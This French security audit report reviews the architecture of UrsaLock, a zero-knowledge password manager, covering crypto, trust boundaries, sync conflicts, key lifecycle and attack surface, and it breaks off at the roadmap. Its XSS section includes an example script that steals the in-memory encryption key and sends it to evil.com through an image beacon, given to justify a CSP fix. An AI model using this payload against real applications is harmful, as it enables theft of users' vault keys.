# UrsaLock - Rapport d'Audit Architectural

**Date**: 2026-02-21  
**Auditeur**: Architecture Review Agent  
**Version**: v0.0.0 (pre-release)

---

## Sommaire Exécutif

UrsaLock est un gestionnaire de mots de passe zero-knowledge implémenté comme monorepo TypeScript. L'architecture repose sur **WebAuthn PRF** pour dériver les clés de chiffrement directement des passkeys, éliminant le besoin de recovery keys traditionnelles. Le serveur stocke uniquement des blobs chiffrés opaques.

### Verdict Global

| Aspect | Note | Commentaire |
|--------|------|-------------|
| Zero-Knowledge Design | ⭐⭐⭐⭐ | Solide, mais quelques détails à améliorer |
| Cryptographie | ⭐⭐⭐⭐⭐ | Excellente utilisation des standards (Web Crypto API) |
| Trust Boundaries | ⭐⭐⭐ | Bonnes séparations, mais dépendances externes critiques |
| Sync Protocol | ⭐⭐⭐ | Fonctionnel mais stratégie de conflits naïve |
| Attack Surface | ⭐⭐⭐ | Risques XSS et supply chain identifiés |

**Recommandation**: Architecture solide pour une v0, mais nécessite durcissement avant production (notamment gestion des conflits, rotation de clés, et mitigation XSS).

---

## 1. Zero-Knowledge Design

### 1.1 Flux de Données

```
┌──────────────────────────────────────────────────────────────┐
│                        CLIENT (Browser)                       │
│                                                               │
│  ┌─────────────┐    ┌──────────────┐    ┌─────────────┐     │
│  │  Passkey    │───▶│ WebAuthn PRF │───▶│  CipherJWK  │     │
│  │ (hardware)  │    │ (256-bit key)│    │ (AES-256)   │     │
│  └─────────────┘    └──────────────┘    └─────────────┘     │
│                            │                     │           │
│                            │                     ▼           │
│                            │            ┌─────────────┐      │
│                            │            │  Encrypt    │      │
│                            │            │  (AES-GCM)  │      │
│                            │            └─────────────┘      │
│                            │                     │           │
│                            ▼                     ▼           │
│                    ┌──────────────┐    ┌─────────────┐      │
│                    │  opaqueId    │    │ Encrypted   │      │
│                    │ (SHA-256 hash)│   │ Blob        │      │
│                    └──────────────┘    └─────────────┘      │
└──────────────────────┬──────────────────────┬────────────────┘
                       │                      │
                       │  HTTPS              │  HTTPS
                       ▼                      ▼
┌──────────────────────────────────────────────────────────────┐
│                        SERVER (Hono)                          │
│                                                               │
│  ┌──────────────┐                    ┌─────────────┐         │
│  │ opaqueId     │────────────────────▶│ SQLite DB   │         │
│  │ (identity)   │                     │  - users    │         │
│  └──────────────┘                     │  - vaults   │         │
│                                        │  - sessions │         │
│  ┌─────────────┐                      └─────────────┘         │
│  │ Encrypted   │                             │                │
│  │ Blob        │─────────────────────────────┘                │
│  │ (opaque)    │                                              │
│  └─────────────┘                                              │
│                                                               │
│  ❌ Jamais de plaintext                                       │
│  ❌ Jamais de cipherJwk                                       │
│  ❌ Jamais de recovery key                                    │
└──────────────────────────────────────────────────────────────┘
```

### 1.2 Analyse du Protocole Zero-Knowledge

#### ✅ Points Forts

1. **Clés dérivées côté client uniquement**
   - `CipherJWK` dérivé via WebAuthn PRF (extension standard)
   - Jamais transmis au serveur ni stocké sur disque
   - Vie uniquement en mémoire pendant la session

2. **Serveur aveugle par design**
   ```typescript
   // packages/server/src/api/vault/router.ts
   // Le serveur manipule uniquement :
   {
     uid: string,           // Identifiant opaque
     name: string,          // Nom du vault (NON chiffré ⚠️)
     data: string,          // Blob chiffré (base64)
     salt: string,          // Salt (vide pour mode JWK)
     version: number,       // Compteur de version
     updatedAt: number      // Timestamp
   }
   ```

3. **Chiffrement standard (AES-256-GCM)**
   ```typescript
   // packages/crypto/src/jwk.ts
   export async function encryptWithJwk(
     plaintext: Uint8Array,
     cipherJwk: CipherJWK
   ): Promise<JwkEncryptedPayload> {
     const result = await CipherCluster.encrypt(cipherJwk, plaintext);
     // IV (12 bytes) + ciphertext + auth tag (16 bytes implicite GCM)
     return { iv, ciphertext, combined };
   }
   ```
   - IV unique par opération (12 bytes, NIST recommended)
   - Auth tag GCM (128 bits) pour intégrité
   - Pas de réutilisation d'IV

#### ⚠️ Faiblesses Identifiées

1. **Nom du vault en clair sur le serveur**
   ```sql
   -- packages/server/src/db/schema.ts
   CREATE TABLE vaults (
     name TEXT NOT NULL,  -- ⚠️ Metadata leak
     ...
   );
   CREATE UNIQUE INDEX idx_vaults_user_name ON vaults(user_id, name);
   ```
   **Impact**: Le serveur connaît les noms des vaults ("passwords", "credit-cards", etc.)  
   **Recommandation**: Chiffrer également le nom ou utiliser un hash

2. **Mode legacy avec recovery key**
   ```typescript
   // packages/crypto/src/derive.ts
   export async function deriveKey(options: DeriveKeyOptions): Promise<DerivedKey> {
     const hash = await argon2id({
       password,
       salt,
       memorySize: 65536, // 64 MiB
       iterations: 3,     // ⚠️ Faible pour certains usages
       parallelism: 4,
     });
   }
   ```
   **Impact**: Recovery key (256 bits entropy) mais Argon2id avec seulement 3 itérations  
   **Recommandation**: Augmenter à 5-10 itérations pour usage password manager, ou documenter clairement que ce mode est déprécié

3. **Salt vide en mode JWK**
   ```typescript
   // packages/zustand/src/storage.ts
   const stored: JwkStoredData = {
     data: bytesToBase64(encrypted.combined),
     version: 2,
     updatedAt: Date.now(),
     mode: "jwk",
     // ⚠️ Pas de salt - réutilisation de clé entre sessions
   };
   ```
   **Impact**: La même `cipherJwk` est réutilisée sans rotation  
   **Recommandation**: Prévoir un mécanisme de rotation de clé (key derivation avec salt unique par vault)

4. **Pas de vérification d'intégrité du code serveur**
   - Le client fait confiance implicite que le serveur renvoie les bons blobs
   - Pas de signature cryptographique des blobs
   **Recommandation**: Ajouter un HMAC ou signature côté client pour détecter les tampering serveur

### 1.3 Dérivation de Clés

#### Mode Principal (WebAuthn PRF)

```typescript
// packages/client/src/passkey.ts
// 1. Registration
await ZKCredentials.registerCredential(displayName, "cross-platform");

// 2. Discover + derive keys
const credential = await ZKCredentials.discoverCredential();
// credential.cipherJwk contient la clé AES-256 dérivée du PRF
```

**Analyse**:
- ✅ Utilise `@z-base/zero-knowledge-credentials` (lib externe)
- ✅ PRF extension = clé dérivée du secret hardware passkey
- ⚠️ **Dépendance critique** à une lib tierce non auditée dans ce rapport
- ⚠️ Pas de fallback si PRF non supporté (erreur utilisateur)

**Recommandation**: Auditer `@z-base/zero-knowledge-credentials` séparément ou implémenter PRF natif

#### Mode Legacy (Recovery Key + Argon2id)

```typescript
// packages/crypto/src/recovery.ts
export function generateRecoveryKey(): RecoveryKey {
  const bytes = randomBytes(32);  // 256 bits entropy
  const raw = bytesToRecoveryKey(bytes);
  const formatted = formatRecoveryKey(raw);
  return { formatted, raw, bytes };
}
// Format: ABCD-EFGH-IJKL-MNOP-QRST-UVWX-YZ23-4567-... (52 chars base32)
```

**Analyse**:
- ✅ 256 bits d'entropie (très solide)
- ✅ Base32 sans caractères ambigus
- ⚠️ Dérivation Argon2id avec 3 itérations (OWASP recommande 3-5 pour high-security)
- ⚠️ Utilisateur doit stocker la recovery key (single point of failure)

---

## 2. Trust Boundaries

### 2.1 Cartographie des Frontières de Confiance

```
┌─────────────────────────────────────────────────────────────────┐
│                    TRUSTED ZONE (Client)                         │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  User's Browser (JavaScript VM)                           │   │
│  │  - Plaintext data                                         │   │
│  │  - CipherJWK (in-memory only)                            │   │
│  │  - Encryption/Decryption logic                           │   │
│  │  - Zustand store                                          │   │
│  └──────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          │ Web Crypto API                        │
│                          ▼                                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Browser Crypto Engine (Native)                           │   │
│  │  - AES-GCM implementation                                 │   │
│  │  - Random number generation                               │   │
│  └──────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          │ WebAuthn API                          │
│                          ▼                                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Hardware Authenticator (YubiKey, TPM, Secure Enclave)   │   │
│  │  - Passkey private key (never leaves)                     │   │
│  │  - PRF derivation                                         │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                          │
                          │ HTTPS (Encrypted Transport)
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                  UNTRUSTED ZONE (Server)                         │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Hono Server (Node.js)                                    │   │
│  │  - Opaque blobs only                                      │   │
│  │  - opaqueId (identity)                                    │   │
│  │  - JWT tokens (session management)                        │   │
│  │  - NO access to plaintext                                 │   │
│  └──────────────────────────────────────────────────────────┘   │
│                          │                                       │
│                          ▼                                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  SQLite Database (better-sqlite3)                         │   │
│  │  - Encrypted vaults (blobs)                               │   │
│  │  - User metadata                                           │   │
│  │  - Sessions                                                │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│              SEMI-TRUSTED (External Dependencies)                │
│  - @z-base/zero-knowledge-credentials (client-side crypto)       │
│  - @z-base/cryptosuite (AES-GCM wrapper)                        │
│  - hash-wasm (Argon2id implementation)                          │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Analyse des Confiances Implicites

#### ❌ Client fait confiance au serveur pour :

1. **Intégrité des blobs retournés**
   ```typescript
   // packages/zustand/src/sync.ts
   const fetchServer = async (): Promise<ServerVault | null> => {
     const res = await httpClient.request({
       url: `${serverUrl}/vault/by-name/${encodeURIComponent(name)}`,
       method: "GET",
       headers: { "Authorization": `Bearer ${token}` },
     });
     if (res.status === 404) return null;
     if (!res.ok) throw new Error(`Server error: ${res.status}`);
     return res.json();  // ⚠️ Pas de vérification d'intégrité
   };
   ```
   **Risque**: Serveur compromis peut renvoyer des blobs modifiés  
   **Impact**: Déchiffrement échoue (bonne chose) MAIS utilisateur ne sait pas si c'est corruption ou attaque  
   **Recommandation**: Ajouter un HMAC ou signature côté client (clé dérivée du cipherJwk)

2. **Authenticité du code JavaScript**
   - Le serveur sert le bundle JS
   - Attaque: serveur compromis sert un JS malveillant qui exfiltre le cipherJwk
   **Mitigation partielle**: HTTPS + CSP  
   **Recommandation**: Subresource Integrity (SRI) pour les CDN, ou signature du bundle

3. **Respect du protocole WebAuthn**
   ```typescript
   // packages/server/src/api/auth/zkc.ts
   const user = getUserByOpaqueId(opaqueId);
   if (!user) {
     throw new ApiException(errors.passkey_not_found as ApiError, 401);
   }
   // ⚠️ Serveur ne vérifie PAS la signature WebAuthn !
   // Il fait confiance que le client a bien vérifié
   ```
   **Risque**: Serveur ne valide pas l'assertion WebAuthn, seulement l'opaqueId  
   **Impact**: Si un attaquant vole un opaqueId, il peut s'authentifier sans passkey  
   **Recommandation**: Implémenter une vraie vérification WebAuthn server-side (utiliser @simplewebauthn/server)

#### ✅ Serveur ne peut PAS :

1. **Lire les données chiffrées** (pas de clé)
2. **Modifier les blobs sans détection** (GCM auth tag échouera)
3. **Bruteforce le chiffrement** (AES-256 + pas de clé)

#### ⚠️ Dépendances Externes Critiques

```json
// packages/client/package.json
{
  "@z-base/zero-knowledge-credentials": "^0.1.0",  // ⚠️ v0.x = unstable
  "@z-base/cryptosuite": "^0.1.0"                  // ⚠️ v0.x = unstable
}
```

**Analyse**:
- Ces libs sont au cœur du zero-knowledge design
- Version 0.x = API instable, possiblement pas auditée
- Pas de vérification de leur implémentation dans cet audit

**Recommandation**: 
1. Auditer ces libs ou fork + audit
2. Vendor les dépendances (copie locale) pour éviter supply chain attacks
3. Utiliser Subresource Integrity si chargées via CDN

---

## 3. Sync Protocol

### 3.1 Architecture du Protocole

```
┌────────────────────────────────────────────────────────────────┐
│                    SYNC ENGINE FLOW                             │
└────────────────────────────────────────────────────────────────┘

  CLIENT                                        SERVER
    │                                             │
    │  1. User modifies Zustand store            │
    │     (e.g., add password)                   │
    │                                             │
    │  2. setState() → persistState()            │
    │     - Encrypt with cipherJwk               │
    │     - Save to localStorage                 │
    │     - localUpdatedAt = Date.now()          │
    │                                             │
    │  3. Debounce 3 seconds                     │
    │     (avoid spam syncs)                     │
    │                                             │
    │  4. sync() triggered                       │
    ├─────────────────────────────────────────────▶
    │     GET /vault/by-name/:name               │
    │                                             │
    │◀────────────────────────────────────────────┤
    │     { data, salt, updatedAt, version }     │
    │                                             │
    │  5. Compare timestamps                     │
    │     if (server.updatedAt > local.updatedAt)│
    │       pull()  // Server wins               │
    │     else                                    │
    │       push()  // Local wins                │
    │                                             │
    │  6. Push local changes                     │
    ├─────────────────────────────────────────────▶
    │     PUT /vault/:uid                        │
    │     { data, salt, version? }               │
    │                                             │
    │                                             │  7. Store in DB
    │                                             │     UPDATE vaults
    │                                             │     SET data = ?, 
    │                                             │         version = version + 1,
    │                                             │         updatedAt = now()
    │◀────────────────────────────────────────────┤
    │     { uid, version, updatedAt }            │
    │                                             │
    │  8. Update local state                     │
    │     localUpdatedAt = server.updatedAt      │
    │                                             │
```

### 3.2 Gestion des Conflits

#### Stratégie Actuelle: Last-Write-Wins (Timestamps)

```typescript
// packages/zustand/src/vault.ts
onServerData: (data, _salt, updatedAt) => {
  // Server has newer data, update local store
  // Only pull if we haven't made local changes since last sync
  if (localUpdatedAt > updatedAt) {
    // Local is actually newer - don't overwrite, push instead
    void syncEngine?.push();
    return;
  }
  // Server wins
  const parsed = JSON.parse(data) as unknown;
  const merged = merge(parsed, get());
  set(merged, true);
  localUpdatedAt = updatedAt;
}
```

**Analyse**:
- ✅ Simple à implémenter
- ❌ **Perte de données possible** si deux devices modifient en même temps
- ❌ Pas de résolution intelligente (merge automatique)
- ❌ Timestamps client-side (peut être manipulé)

#### ⚠️ Scénario de Race Condition

```
Device A                    Server                  Device B
   │                          │                        │
   │  local: v1 (10:00:00)   │                        │
   │                          │  server: v1 (10:00:00)│
   │                          │                        │
   │  Modify @ 10:00:05      │                        │  Modify @ 10:00:06
   │  localUpdatedAt=10:00:05│                        │  localUpdatedAt=10:00:06
   │                          │                        │
   │  sync() at 10:00:08     │                        │
   ├──────PUT /vault/uid────►│                        │
   │  { data: A', updatedAt: 10:00:05 }              │
   │                          │                        │
   │                          │  ✅ Accept (no conflict)│
   │◄─────200 OK─────────────┤                        │
   │                          │  server: v2 (10:00:08)│
   │                          │                        │
   │                          │                        │  sync() at 10:00:10
   │                          │◄──────PUT /vault/uid──┤
   │                          │  { data: B', updatedAt: 10:00:06 }
   │                          │                        │
   │                          │  ⚠️ B.updatedAt < server.updatedAt
   │                          │  BUT no version check! │
   │                          │  ✅ Accept anyway      │
   │                          ├──────200 OK──────────►│
   │                          │  server: v3 (10:00:10)│
   │                          │                        │
   │  Pull @ 10:00:30        │                        │
   ├──────GET /vault/by-name►│                        │
   │◄─────{ data: B' }───────┤                        │
   │  ❌ Device A's changes lost!                     │
```

**Impact**: Les modifications de Device A sont écrasées par Device B

#### Optimistic Locking (Partiellement Implémenté)

```typescript
// packages/server/src/db/client.ts
export function updateVault(uid: string, userId: number, input: UpdateVaultInput) {
  if (input.version != null) {
    // Optimistic locking: only update if version matches
    const stmt = db.prepare(`
      UPDATE vaults SET data = ?, salt = ?, version = ? + 1, updated_at = unixepoch()
      WHERE uid = ? AND user_id = ? AND version = ?
      RETURNING ...
    `);
    return stmt.get(input.data, input.salt, input.version, uid, userId, input.version);
  }
  // ⚠️ Fallback: no version check
}
```

**Analyse**:
- ✅ Version check existe dans la DB
- ❌ **Pas utilisé par le client sync** (version optionnelle, jamais passée)
- ❌ Conflit retourne 404 au lieu de 409 (confusing)

**Recommandation**: 
1. **Toujours envoyer la version** dans PUT /vault/:uid
2. Retourner HTTP 409 Conflict si version mismatch
3. Implémenter une stratégie de merge côté client (CRDTs ou 3-way merge)

### 3.3 Offline Queue

```typescript
// packages/zustand/src/sync.ts
const enqueue = (data: string, salt: string): void => {
  const queue = loadQueue();
  queue.pending.push({ data, salt, timestamp: Date.now() });
  // Keep only last 10 pending changes
  if (queue.pending.length > 10) {
    queue.pending = queue.pending.slice(-10);
  }
  saveQueue(queue);
};
```

**Analyse**:
- ✅ Changements offline sont sauvegardés
- ⚠️ **Limite arbitraire de 10** changements (peut perdre des modifs anciennes)
- ⚠️ Seulement le **plus récent** est pushé au sync suivant
- ❌ Pas de retry automatique en cas d'erreur réseau

**Recommandation**:
1. Augmenter la limite ou rendre configurable
2. Pusher TOUS les changements de la queue (avec deduplication)
3. Implémenter un retry exponentiel avec backoff

### 3.4 Intégrité des Données

#### Protection contre la Corruption

```typescript
// packages/crypto/src/providers/web-crypto.ts
try {
  const plaintext = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv: iv as Uint8Array<ArrayBuffer> },
    cryptoKey,
    ciphertext
  );
  return new Uint8Array(plaintext);
} catch (error) {
  throw new Error('Decryption failed: invalid key or corrupted data');
}
```

**Analyse**:
- ✅ AES-GCM détecte automatiquement les corruptions (auth tag)
- ✅ Erreur explicite si le blob est modifié
- ❌ **Pas de distinction** entre "mauvaise clé" et "corruption" (UX problématique)
- ❌ Pas de checksum additionnel (ex: SHA-256 du plaintext avant chiffrement)

**Recommandation**: Ajouter un metadata hash pour détecter la corruption AVANT déchiffrement

---

## 4. Key Management Lifecycle

### 4.1 Création de Clés

#### Mode WebAuthn PRF (Recommandé)

```
┌─────────────────────────────────────────────────────────────┐
│  1. User Registration                                        │
│     - Browser triggers navigator.credentials.create()        │
│     - Hardware generates passkey (private key never leaves)  │
│     - PRF extension derives cipherJwk from passkey secret   │
│                                                              │
│  2. Server Registration                                      │
│     - Client sends opaqueId = SHA256(passkey.rawId)         │
│     - Server stores opaqueId (no passkey material)          │
│     - Issues JWT token                                       │
│                                                              │
│  3. Client Stores                                            │
│     - cipherJwk → RAM only (sessionStorage for persistence) │
│     - JWT → localStorage                                     │
│     - No recovery key generated                             │
└─────────────────────────────────────────────────────────────┘
```

**Analyse**:
- ✅ Pas de recovery key à gérer
- ✅ Clé dérivée déterministiquement du passkey
- ⚠️ **cipherJwk perdu au refresh** → nécessite ré-auth
- ⚠️ Pas de mécanisme de rotation de clé

#### Mode Legacy (Recovery Key)

```typescript
// packages/crypto/src/recovery.ts
export function generateRecoveryKey(): RecoveryKey {
  const bytes = randomBytes(32);  // 256 bits
  return {
    formatted: "ABCD-EFGH-...",
    raw: "ABCDEFGH...",
    bytes
  };
}
```

**Analyse**:
- ✅ 256 bits d'entropie (excellent)
- ❌ **Utilisateur responsable du stockage** (paper, password manager, etc.)
- ❌ Pas de mécanisme de rotation
- ❌ Si perdu = perte totale des données

### 4.2 Rotation de Clés

**Status Actuel**: ❌ **NON IMPLÉMENTÉ**

```typescript
// Aucun code de rotation trouvé dans le codebase
// La même cipherJwk est réutilisée indéfiniment
```

**Risques**:
1. Même clé utilisée pour tous les vaults d'un utilisateur
2. Pas de forward secrecy (si clé compromise, tout l'historique est lisible)
3. Pas de mécanisme de migration si l'utilisateur veut changer de passkey

**Recommandation**: Implémenter un système de rotation

```typescript
// Proposition d'architecture
interface VaultKey {
  version: number;
  derivedKey: CryptoKey;  // Dérivé de cipherJwk + salt unique
  createdAt: number;
  expiresAt?: number;
}

// Chaque vault a sa propre clé dérivée
const vaultKey = await deriveVaultKey(cipherJwk, vaultSalt);
```

### 4.3 Recovery (Récupération)

#### Mode WebAuthn

```typescript
// packages/client/src/passkey.ts
async signIn(_options: unknown): Promise<ZKAuthResult> {
  const credential = await ZKCredentials.discoverCredential();
  // ✅ Même passkey = même cipherJwk
  // Automatic recovery si passkey synced (iCloud, Google, etc.)
}
```

**Analyse**:
- ✅ Transparent si passkey provider sync (iCloud Keychain, Google Password Manager)
- ❌ **Impossible** si passkey perdu ET device perdu (YubiKey physique volée)
- ❌ Pas de backup secondaire

#### Mode Legacy

```typescript
// Utilisateur entre sa recovery key
const keyBytes = recoveryKeyToBytes("ABCD-EFGH-...");
const { key } = await deriveKey({ password: keyBytes, salt: storedSalt });
// Déchiffre les blobs avec cette clé
```

**Analyse**:
- ✅ Fonctionne si l'utilisateur a bien sauvegardé la clé
- ❌ Single point of failure
- ❌ Pas de recovery si clé perdue

**Recommandation**: Implémenter un système de multi-factor recovery

```typescript
// Proposition
interface RecoveryOptions {
  method: "passkey" | "recovery-key" | "social-recovery";
  threshold?: number;  // Pour Shamir Secret Sharing
}
```

### 4.4 Destruction de Clés

#### Client-Side

```typescript
// packages/client/src/client.ts
async signOut(): Promise<void> {
  this.tokenManager.clearToken();
  this.clearUserFromStorage();
  this.updateState({
    credential: null,  // ⚠️ GC dépendant du JS engine
  });
}
```

**Analyse**:
- ⚠️ Pas de **wipe explicite** de la mémoire
- ⚠️ cipherJwk peut rester en RAM jusqu'au GC
- ❌ Pas de overwrite avec des zéros (impossible en JS standard)

**Recommandation**: Documenter que le wipe sécurisé est impossible en JS

#### Server-Side

```typescript
// packages/server/src/api/vault/router.ts
.delete("/:uid", (c) => {
  return c.json(vaultService.deleteVault(uid, session.user.id));
});
```

```sql
-- packages/server/src/db/client.ts
DELETE FROM vaults WHERE uid = ? AND user_id = ?;
```

**Analyse**:
- ✅ Suppression SQL immédiate
- ⚠️ SQLite WAL (Write-Ahead Logging) peut conserver des copies temporaires
- ⚠️ Pas de "secure delete" (overwrite avec random data)

**Recommandation**: Activer `PRAGMA secure_delete = ON` en SQLite

---

## 5. Attack Surface

### 5.1 Vecteurs d'Attaque Identifiés

#### 🔴 CRITIQUE: XSS (Cross-Site Scripting)

**Scénario**:
```html
<!-- Attaquant injecte du JS malveillant -->
<script>
  // Voler le cipherJwk en mémoire
  const useStore = window.__ZUSTAND_STORE__;
  const cipherJwk = useStore.getState().vault.credential?.cipherJwk;
  
  // Exfiltrer via image beacon
  new Image().src = "https://evil.com/steal?key=" + JSON.stringify(cipherJwk);
</script>
```

**Impact**: **TOTAL COMPROMISE** - l'attaquant peut déchiffrer toutes les données

**Mitigation Actuelle**:
```typescript
// Aucune CSP trouvée dans le code serveur
// packages/server/src/app.ts ne configure pas de Content-Security-Policy
```

**Recommandation URGENTE**:
```typescript
// Ajouter CSP stricte
app.use("/*", async (c, next) => {
  c.header("Content-Security-Policy", 
    "default-src 'self'; " +
    "script-src 'self'; " +  // Pas de inline scripts
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data:; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';"
  );
  await next();
});
```

#### 🟡 ÉLEVÉ: Supply Chain Attack

**Dépendances Critiques**:
```json
{
  "@z-base/zero-knowledge-credentials": "^0.1.0",  // ⚠️
  "@z-base/cryptosuite": "^0.1.0",                 // ⚠️
  "hash-wasm": "^4.11.0",                          // ⚠️
  "better-sqlite3": "^9.4.0",
  "hono": "^4.0.0"
}
```

**Risques**:
1. Version 0.x = API instable, possiblement non auditée
2. Compromise d'une lib = backdoor dans le chiffrement
3. Typosquatting (ex: `@z-base/zero-knowlege-credentials`)

**Recommandation**:
1. **Vendor les dépendances critiques** (copie locale + audit)
2. Utiliser `npm audit` + Dependabot
3. Lock les versions exactes (pas de `^`)
4. Subresource Integrity (SRI) si CDN

```json
{
  "@z-base/zero-knowledge-credentials": "0.1.0",  // Exact version
  "@z-base/cryptosuite": "0.1.0"
}
```

#### 🟡 ÉLEVÉ: Compromission Serveur

**Scénario**: Attaquant obtient accès SSH au serveur

**Ce qu'il peut faire**:
- ✅ Voler les blobs chiffrés (inutile sans clé)
- ✅ Voler les JWT tokens (session hijacking)
- ✅ Modifier le code JS servi (XSS)
- ❌ Lire les données chiffrées (pas de clé)

**Ce qu'il NE peut PAS faire**:
- ❌ Déchiffrer les vaults (pas de cipherJwk)
- ❌ Bruteforce AES-256-GCM (infaisable)

**Mitigation**:
- ✅ Zero-knowledge design limite les dégâts
- ⚠️ JWT secret en ENV (si compromis = session hijacking total)
- ⚠️ Pas de rotation des secrets

**Recommandation**:
1. Rotation régulière du `JWT_SECRET`
2. HSTS + Certificate Pinning
3. Audit logs serveur
4. Rate limiting sur les endpoints sensibles

#### 🟠 MOYEN: Man-in-the-Middle (MITM)

**Scénario**: Attaquant intercepte le trafic HTTPS

**Mitigation Actuelle**:
- ✅ HTTPS obligatoire (assumé, pas vérifié dans le code)
- ✅ AES-GCM inclut un auth tag (détecte tampering)

**Faiblesses**:
```typescript
// packages/client/src/client.ts
async fetch(path: string, options: RequestInit = {}): Promise<Response> {
  const url = path.startsWith("http") ? path : `${this.options.serverUrl}${path}`;
  // ⚠️ Pas de Certificate Pinning
  return fetch(url, { ...options });
}
```

**Recommandation**:
1. HSTS header (`Strict-Transport-Security`)
2. Certificate Pinning (difficile en web, plus facile en app native)
3. Subresource Integrity (SRI) pour les scripts

#### 🟠 MOYEN: Phishing + Credential Stuffing

**Scénario**: Attaquant créé un faux site ursalock.com

**Mitigation WebAuthn**:
- ✅ Passkey lié au domaine (RP ID)
- ✅ Impossible de phish un passkey (domaine binding)

**Faiblesses**:
- ⚠️ Mode legacy email/password (si implémenté) est vulnérable
- ⚠️ Utilisateur peut être trompé pour entrer sa recovery key

**Recommandation**: Mode passkey uniquement en production

#### 🟢 FAIBLE: Rainbow Tables (Recovery Key)

**Scénario**: Attaquant a accès aux blobs et veut bruteforce la recovery key

**Mitigation**:
- ✅ 256 bits d'entropie = 2^256 combinaisons (infaisable)
- ✅ Argon2id avec salt unique = pas de rainbow tables
- ✅ AES-256-GCM résiste au bruteforce

**Analyse**: Risque négligeable (sauf quantum computers futur)

### 5.2 Matrice de Risques

| Vecteur | Probabilité | Impact | Risque Global | Mitigation |
|---------|-------------|--------|---------------|------------|
| XSS | 🟡 Moyenne | 🔴 Critique | 🔴 **ÉLEVÉ** | CSP stricte, sanitize inputs |
| Supply Chain | 🟠 Faible | 🔴 Critique | 🟡 **MOYEN** | Vendor deps, SRI, audit |
| Server Compromise | 🟠 Faible | 🟡 Élevé | 🟡 **MOYEN** | Secrets rotation, audit logs |
| MITM | 🟢 Très Faible | 🟡 Élevé | 🟠 **FAIBLE** | HSTS, cert pinning |
| Phishing | 🟠 Faible | 🟠 Moyen | 🟢 **FAIBLE** | Passkey-only mode |
| Rainbow Tables | 🟢 Négligeable | 🟡 Élevé | 🟢 **NÉGLIGEABLE** | Déjà mitigé |

### 5.3 Recommandations par Priorité

#### P0 (Urgent - Avant Production)

1. **Implémenter CSP stricte**
   ```typescript
   app.use(csp({
     defaultSrc: ["'self'"],
     scriptSrc: ["'self'"],
     styleSrc: ["'self'", "'unsafe-inline'"],
     imgSrc: ["'self'", "data:"],
     connectSrc: ["'self'"],
     frameAncestors: ["'none'"]
   }));
   ```

2. **Auditer les dépendances @z-base**
   - Review du code source de `@z-base/zero-knowledge-credentials`
   - Tests de sécurité de `@z-base/cryptosuite`
   - Fork + vendor si non satisfaisant

3. **Implémenter vérification WebAuthn serveur**
   ```typescript
   import { verifyAuthenticationResponse } from "@simplewebauthn/server";
   
   // Au lieu de juste vérifier opaqueId, vérifier l'assertion complète
   const verification = await verifyAuthenticationResponse({
     response: clientAssertion,
     expectedChallenge,
     expectedOrigin,
     expectedRPID,
     authenticator: { credentialPublicKey, counter }
   });
   ```

4. **Optimistic locking obligatoire**
   ```typescript
   // Toujours envoyer la version dans PUT
   await api.putBlob({
     ...encryptedBlob,
     version: currentVersion  // Obligatoire, pas optionnel
   });
   ```

#### P1 (Important - Court Terme)

1. **Stratégie de résolution de conflits**
   - Implémenter 3-way merge ou CRDTs
   - UI pour résoudre les conflits manuellement
   - Retry avec backoff pour offline queue

2. **Rotation de clés**
   ```typescript
   interface VaultKeychain {
     currentKey: VaultKey;
     previousKeys: VaultKey[];
   }
   
   async rotateKey(newCipherJwk: CipherJWK) {
     // Re-encrypt all vaults with new key
     // Keep old key for backward compat
   }
   ```

3. **HSTS + Security Headers**
   ```typescript
   app.use(secureHeaders({
     strictTransportSecurity: "max-age=31536000; includeSubDomains",
     xFrameOptions: "DENY",
     xContentTypeOptions: "nosniff",
     referrerPolicy: "strict-origin-when-cross-origin"
   }));
   ```

4. **Rate Limiting**
   ```typescript
   import { rateLimiter } from "hono-rate-limiter";
   
   app.use("/auth/*", rateLimiter({
     windowMs: 15 * 60 * 1000,  // 15 minutes
     max: 5,  // 5 attempts
     message: "Too many auth attempts"
   }));
   ```

#### P2 (Nice-to-Have - Long Terme)

1. **Audit logging**
   ```typescript
   app.use(async (c, next) => {
     const start = Date.now();
     await next();
     await auditLog.write({
       timestamp: Date.now(),
       userId: c.get("session")?.user.id,
       endpoint: c.req.path,
       method: c.req.method,
       duration: Date.now() - start
     });
   });
   ```

2. **Multi-factor recovery**
   - Shamir Secret Sharing (split recovery key en 5 parts, need 3 to recover)
   - Social recovery (delegates can help recover)

3. **Forward Secrecy**
   - Key rotation automatique tous les N jours
   - Archive old keys encrypted with new key

4. **Quantum-Resistant Crypto**
   - Monitoring de NIST post-quantum standards
   - Migration path vers algorithmes PQC

---

## 6. Recommandations Globales

### 6.1 Architecture

#### ✅ Points Forts à Conserver

1. **Zero-Knowledge Design** - Excellente séparation client/serveur
2. **Web Crypto API** - Standards natifs, pas de lib crypto custom
3. **SOLID Principles** - Code testable et maintenable
4. **WebAuthn PRF** - Moderne, pas de recovery key à gérer

#### 🔧 Améliorations Nécessaires

1. **Trust Model**
   - [ ] Implémenter HMAC ou signature des blobs côté client
   - [ ] WebAuthn verification server-side (not just opaqueId)
   - [ ] Vendor les dépendances critiques après audit

2. **Sync Robustness**
   - [ ] Optimistic locking obligatoire avec version
   - [ ] Stratégie de merge intelligente (CRDTs ou 3-way)
   - [ ] Retry avec backoff pour offline queue
   - [ ] Meilleure gestion des conflits (UI + backend)

3. **Key Management**
   - [ ] Rotation de clés avec re-encryption
   - [ ] Multi-device key sync (backup passkey)
   - [ ] Recovery multi-factor (Shamir, social recovery)

4. **Security Hardening**
   - [ ] CSP stricte (P0)
   - [ ] HSTS + security headers (P1)
   - [ ] Rate limiting (P1)
   - [ ] Audit logging (P2)

### 6.2 Roadmap Suggérée

#### Phase 1: Security Essentials (1-2 weeks)
